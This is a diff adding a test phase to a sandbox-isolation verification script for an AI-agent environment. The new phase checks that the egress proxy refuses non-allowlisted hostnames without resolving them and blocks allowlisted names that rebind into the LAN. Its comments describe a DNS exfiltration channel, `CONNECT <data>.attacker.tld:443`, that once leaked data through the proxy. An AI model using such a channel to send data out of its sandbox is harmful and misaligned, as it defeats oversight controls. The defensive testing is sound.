@@ -42,6 +42,9 @@
 #                               (gVisor gives it its own PID namespace) must say
 #                               NOT armed; simulated here with a docker shim, run
 #                               for real under runsc by CI's gVisor job.
+#    L. Proxy DNS               - the egress proxy must refuse a non-allowlisted
+#                               name without resolving it (a logging fake DNS
+#                               sees every lookup): no DNS exfiltration.
 #
 #  Usage:  ./scripts/verify-isolation.sh [--keep] [--no-breach] [--no-sentinel]
 # =============================================================================
@@ -56,6 +59,7 @@ export MSYS_NO_PATHCONV=1
 export MSYS2_ARG_CONV_EXCL='*'
 
 readonly AGENT_IMAGE="ai-warden/agent:latest"
+readonly PROXY_IMAGE="ai-warden/egress-proxy:latest"
 readonly INTERNAL_NET="warden_internal"
 
 KEEP=0
@@ -119,7 +123,9 @@ cleanup() {
     docker rm -f warden-verify-selftest warden-verify-breach warden-verify-failclosed \
         warden-verify-e1 warden-verify-e1-read warden-verify-e2 warden-verify-e2b warden-verify-e9 warden-verify-e3 warden-verify-e5 \
         warden-verify-e4-setup warden-verify-e4-seed warden-verify-e4-read \
-        warden-verify-rt warden-verify-i0 warden-verify-h-busy >/dev/null 2>&1 || true
+        warden-verify-rt warden-verify-i0 warden-verify-h-busy \
+        warden-verify-l-dns warden-verify-l-proxy >/dev/null 2>&1 || true
+    docker network rm "warden-verify-l-$$" >/dev/null 2>&1 || true
     # Phase F's passthrough check runs a real sandbox via warden-cli; sweep it and
     # its vault by label in case the suite was interrupted mid-check.
     local rtp_leftover
@@ -1501,6 +1507,81 @@ else
     fi
 fi
 rm -rf "$K_DIR" "$K_WS" "$K_OUT" 2>/dev/null || true
+
+# =============================================================================
+printf '\n%s======== PHASE L: the proxy resolves only allowlisted names =========%s\n' "$C_BOLD" "$C_RESET"
+# =============================================================================
+# squid's `dst` ACL (private_dst) needs the destination's address, so squid
+# resolves the name first. It used to be checked BEFORE the allowlist, so every
+# hostname the agent put in a CONNECT was resolved - and only then refused 403:
+# `CONNECT <data>.attacker.tld:443` delivered <data> to the attacker's
+# nameserver, a DNS exfiltration channel through the one exit (session 12).
+# The real proxy image runs here with a copy of squid.conf whose only change is
+# `dns_nameservers` pointing at a logging fake DNS on a private internal network.
+info "the egress proxy must refuse a non-allowlisted name WITHOUT resolving it (no DNS exfiltration)"
+printf '\n'
+L_NET="warden-verify-l-$$"
+L_DIR="$(mktemp -d)"
+L_EXFIL="l-$$-exfil.warden-exfil.example"
+L_REBIND="rebind.warden-test.example"
+l_fail() { bad "phase L: $*"; PHASE_FAILURES=$((PHASE_FAILURES + 1)); }
+docker network create --internal "$L_NET" >/dev/null
+cp "${SCRIPT_DIR}/drill-fake-dns.py" "${L_DIR}/fake_dns.py"
+# mktemp -d is 0700: the uid-1001 fake DNS could not read its script and died.
+chmod 0755 "$L_DIR" 2>/dev/null || true
+chmod 0644 "${L_DIR}/fake_dns.py" 2>/dev/null || true
+docker run -d --name warden-verify-l-dns --network "$L_NET" \
+    --user 1001:1001 --cap-drop=ALL --security-opt no-new-privileges:true \
+    --sysctl net.ipv4.ip_unprivileged_port_start=0 \
+    -v "$(host_path "$L_DIR"):/drill:ro" \
+    --entrypoint python3 "$AGENT_IMAGE" -u /drill/fake_dns.py >/dev/null
+l_ip() { docker inspect -f "{{(index .NetworkSettings.Networks \"${L_NET}\").IPAddress}}" "$1" 2>/dev/null; }
+l_dns_ip="$(l_ip warden-verify-l-dns)"
+{ cat "${PROJECT_ROOT}/core/network/squid.conf"; printf 'dns_nameservers %s\n' "$l_dns_ip"; } > "${L_DIR}/squid.conf"
+{ cat "${PROJECT_ROOT}/core/network/whitelist_domains.txt"; printf '%s\n' "$L_REBIND"; } > "${L_DIR}/whitelist_domains.txt"
+chmod 0644 "${L_DIR}/squid.conf" "${L_DIR}/whitelist_domains.txt" 2>/dev/null || true
+docker run -d --name warden-verify-l-proxy --network "$L_NET" \
+    -v "$(host_path "${L_DIR}/squid.conf"):/etc/squid/squid.conf:ro" \
+    -v "$(host_path "${L_DIR}/whitelist_domains.txt"):/etc/squid/whitelist_domains.txt:ro" \
+    "$PROXY_IMAGE" >/dev/null
+l_proxy_ip="$(l_ip warden-verify-l-proxy)"
+for _ in $(seq 1 30); do
+    l_log="$(docker logs warden-verify-l-proxy 2>&1)"
+    case "$l_log" in *"Accepting HTTP"*) break ;; esac
+    sleep 1
+done
+l_connect() {
+    docker run --rm --network "$L_NET" --entrypoint curl "$AGENT_IMAGE" \
+        -s -o /dev/null --max-time 15 -x "http://${l_proxy_ip}:3128" "https://${1}/" >/dev/null 2>&1 || true
+}
+l_connect "$L_EXFIL"
+l_connect api.anthropic.com
+l_connect "$L_REBIND"
+sleep 1
+l_dns="$(docker logs warden-verify-l-dns 2>&1)"
+l_access="$(docker logs warden-verify-l-proxy 2>/dev/null)"
+docker rm -f warden-verify-l-dns warden-verify-l-proxy >/dev/null 2>&1 || true
+docker network rm "$L_NET" >/dev/null 2>&1 || true
+rm -rf "$L_DIR" 2>/dev/null || true
+l_saw() { printf '%s\n' "$l_dns" | grep -c "^QUERY ${1} " || true; }
+l_denied() { printf '%s\n' "$l_access" | grep -cE "TCP_DENIED/403 [0-9]+ CONNECT ${1}:443" || true; }
+# Positive controls first: squid must be asking THIS resolver (an allowlisted
+# name shows up there) and the probe must have reached squid (403 logged).
+if [ "$(l_saw api.anthropic.com)" = "0" ] || [ "$(l_denied "$L_EXFIL")" = "0" ]; then
+    l_fail "the drill was not staged, it proves nothing (resolver seen by squid: $(l_saw api.anthropic.com), probe refused: $(l_denied "$L_EXFIL"), proxy ${l_proxy_ip:-?}, dns ${l_dns_ip:-?})"
+    printf '%s\n' "$l_log" | grep -E 'FATAL|ERROR' | head -3 | sed 's/^/         /'
+else
+    if [ "$(l_saw "$L_EXFIL")" = "0" ]; then
+        good "phase L: a CONNECT to a non-allowlisted name was refused (403) without a DNS lookup"
+    else
+        l_fail "the proxy resolved the non-allowlisted name ${L_EXFIL} before refusing it - a DNS exfiltration channel"
+    fi
+    if [ "$(l_saw "$L_REBIND")" != "0" ] && [ "$(l_denied "$L_REBIND")" != "0" ]; then
+        good "phase L: an allowlisted name that resolves into the LAN (10.1.2.3) is still refused"
+    else
+        l_fail "an allowlisted name resolving to 10.1.2.3 was not refused (queried: $(l_saw "$L_REBIND"), refused: $(l_denied "$L_REBIND"))"
+    fi
+fi
 
 # =============================================================================
 printf '\n%s=========================== RESULT ==============================%s\n' "$C_BOLD" "$C_RESET"
